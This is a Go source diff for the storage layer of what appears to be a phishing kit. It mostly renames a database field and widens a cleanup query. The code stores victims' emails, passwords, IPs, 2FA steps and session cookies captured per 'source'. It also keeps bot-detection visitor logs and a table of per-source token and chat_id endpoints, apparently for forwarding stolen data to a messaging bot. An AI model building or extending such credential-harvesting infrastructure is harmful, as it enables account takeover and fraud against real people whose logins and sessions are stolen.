@@ -9,7 +9,7 @@ import (
 )
 
 type Storage struct {
-	db *sql.DB
+	DB *sql.DB
 }
 
 type Submission struct {
@@ -92,11 +92,11 @@ func New(dataDir string) (*Storage, error) {
 		}
 	}
 
-	return &Storage{db: db}, nil
+	return &Storage{DB: db}, nil
 }
 
 func (s *Storage) Close() error {
-	return s.db.Close()
+	return s.DB.Close()
 }
 
 func (s *Storage) CreateOrUpdateSubmission(id, source, email, password, ip, userAgent string) error {
@@ -104,29 +104,29 @@ func (s *Storage) CreateOrUpdateSubmission(id, source, email, password, ip, user
 	
 	// Check if exists
 	var count int
-	s.db.QueryRow("SELECT COUNT(*) FROM submissions WHERE email = ? AND source = ?", email, source).Scan(&count)
+	s.DB.QueryRow("SELECT COUNT(*) FROM submissions WHERE email = ? AND source = ?", email, source).Scan(&count)
 	
 	if count == 0 {
-		_, err := s.db.Exec(`INSERT INTO submissions (id, source, email, password, ip, user_agent, step1, step2, created_at, updated_at) 
+		_, err := s.DB.Exec(`INSERT INTO submissions (id, source, email, password, ip, user_agent, step1, step2, created_at, updated_at) 
 			VALUES (?, ?, ?, ?, ?, ?, 1, 1, ?, ?)`,
 			id, source, email, password, ip, userAgent, now, now)
 		return err
 	}
 	
 	// Update existing
-	_, err := s.db.Exec(`UPDATE submissions SET password = ?, ip = ?, user_agent = ?, step2 = 1, updated_at = ? 
+	_, err := s.DB.Exec(`UPDATE submissions SET password = ?, ip = ?, user_agent = ?, step2 = 1, updated_at = ? 
 		WHERE email = ? AND source = ?`, password, ip, userAgent, now, email, source)
 	return err
 }
 
 func (s *Storage) Update2FA(email, source, code string) error {
-	_, err := s.db.Exec(`UPDATE submissions SET step3 = 1, updated_at = ? 
+	_, err := s.DB.Exec(`UPDATE submissions SET step3 = 1, updated_at = ? 
 		WHERE email = ? AND source = ?`, time.Now().Format(time.RFC3339), email, source)
 	return err
 }
 
 func (s *Storage) UpdateSession(email, source, cookies string) error {
-	_, err := s.db.Exec(`UPDATE submissions SET cookies = ?, completed = 1, updated_at = ? 
+	_, err := s.DB.Exec(`UPDATE submissions SET cookies = ?, completed = 1, updated_at = ? 
 		WHERE email = ? AND source = ?`, cookies, time.Now().Format(time.RFC3339), email, source)
 	return err
 }
@@ -134,7 +134,7 @@ func (s *Storage) UpdateSession(email, source, cookies string) error {
 func (s *Storage) GetSubmission(email, source string) (*Submission, error) {
 	var sub Submission
 	var cookies sql.NullString
-	err := s.db.QueryRow(`SELECT id, source, email, password, ip, user_agent, step1, step2, step3, completed, cookies, created_at, updated_at 
+	err := s.DB.QueryRow(`SELECT id, source, email, password, ip, user_agent, step1, step2, step3, completed, cookies, created_at, updated_at 
 		FROM submissions WHERE email = ? AND source = ? ORDER BY created_at DESC LIMIT 1`,
 		email, source).Scan(&sub.ID, &sub.Source, &sub.Email, &sub.Password, &sub.IP, &sub.UserAgent,
 		&sub.Step1, &sub.Step2, &sub.Step3, &sub.Completed, &cookies, &sub.CreatedAt, &sub.UpdatedAt)
@@ -148,7 +148,7 @@ func (s *Storage) GetSubmission(email, source string) (*Submission, error) {
 }
 
 func (s *Storage) GetRecentSubmissions(limit int) ([]Submission, error) {
-	rows, err := s.db.Query(`SELECT id, source, email, password, ip, step1, step2, step3, completed, created_at 
+	rows, err := s.DB.Query(`SELECT id, source, email, password, ip, step1, step2, step3, completed, created_at 
 		FROM submissions ORDER BY created_at DESC LIMIT ?`, limit)
 	if err != nil {
 		return nil, err
@@ -169,24 +169,24 @@ func (s *Storage) GetRecentSubmissions(limit int) ([]Submission, error) {
 }
 
 func (s *Storage) SaveVisitor(source, ip, userAgent, referer string, isBot bool, botName string) error {
-	_, err := s.db.Exec(`INSERT INTO visitors (source, ip, user_agent, is_bot, bot_name, referer, created_at) 
+	_, err := s.DB.Exec(`INSERT INTO visitors (source, ip, user_agent, is_bot, bot_name, referer, created_at) 
 		VALUES (?, ?, ?, ?, ?, ?, ?)`,
 		source, ip, userAgent, boolToInt(isBot), botName, referer, time.Now().Format(time.RFC3339))
 	return err
 }
 
 func (s *Storage) GetStats() (visitors, humans, bots, submissions, completed int, err error) {
-	s.db.QueryRow("SELECT COUNT(*) FROM visitors").Scan(&visitors)
-	s.db.QueryRow("SELECT COUNT(*) FROM visitors WHERE is_bot = 0").Scan(&humans)
-	s.db.QueryRow("SELECT COUNT(*) FROM visitors WHERE is_bot = 1").Scan(&bots)
-	s.db.QueryRow("SELECT COUNT(*) FROM submissions").Scan(&submissions)
-	s.db.QueryRow("SELECT COUNT(*) FROM submissions WHERE completed = 1").Scan(&completed)
+	s.DB.QueryRow("SELECT COUNT(*) FROM visitors").Scan(&visitors)
+	s.DB.QueryRow("SELECT COUNT(*) FROM visitors WHERE is_bot = 0").Scan(&humans)
+	s.DB.QueryRow("SELECT COUNT(*) FROM visitors WHERE is_bot = 1").Scan(&bots)
+	s.DB.QueryRow("SELECT COUNT(*) FROM submissions").Scan(&submissions)
+	s.DB.QueryRow("SELECT COUNT(*) FROM submissions WHERE completed = 1").Scan(&completed)
 	return
 }
 
 func (s *Storage) GetEndpoint(source string) (token, chatID string, err error) {
 	var t, c sql.NullString
-	err = s.db.QueryRow("SELECT token, chat_id FROM endpoints WHERE source = ?", source).Scan(&t, &c)
+	err = s.DB.QueryRow("SELECT token, chat_id FROM endpoints WHERE source = ?", source).Scan(&t, &c)
 	if t.Valid {
 		token = t.String
 	}
@@ -197,13 +197,13 @@ func (s *Storage) GetEndpoint(source string) (token, chatID string, err error) {
 }
 
 func (s *Storage) SetEndpoint(source, subdomain, token, chatID string) error {
-	_, err := s.db.Exec(`INSERT OR REPLACE INTO endpoints (source, subdomain, token, chat_id, created_at) 
+	_, err := s.DB.Exec(`INSERT OR REPLACE INTO endpoints (source, subdomain, token, chat_id, created_at) 
 		VALUES (?, ?, ?, ?, ?)`, source, subdomain, token, chatID, time.Now().Format(time.RFC3339))
 	return err
 }
 
 func (s *Storage) ListEndpoints() (map[string]string, error) {
-	rows, err := s.db.Query("SELECT source, subdomain FROM endpoints")
+	rows, err := s.DB.Query("SELECT source, subdomain FROM endpoints")
 	if err != nil {
 		return nil, err
 	}
@@ -220,15 +220,15 @@ func (s *Storage) ListEndpoints() (map[string]string, error) {
 
 func (s *Storage) Cleanup(days int) error {
 	cutoff := time.Now().AddDate(0, 0, -days).Format(time.RFC3339)
-	_, err := s.db.Exec("DELETE FROM submissions WHERE created_at < ? AND completed = 1", cutoff)
+	_, err := s.DB.Exec("DELETE FROM submissions WHERE created_at < ?", cutoff)
 	if err != nil {
 		return err
 	}
-	_, err = s.db.Exec("DELETE FROM visitors WHERE created_at < ?", cutoff)
+	_, err = s.DB.Exec("DELETE FROM visitors WHERE created_at < ?", cutoff)
 	if err != nil {
 		return err
 	}
-	_, err = s.db.Exec("VACUUM")
+	_, err = s.DB.Exec("VACUUM")
 	return err
 }
 
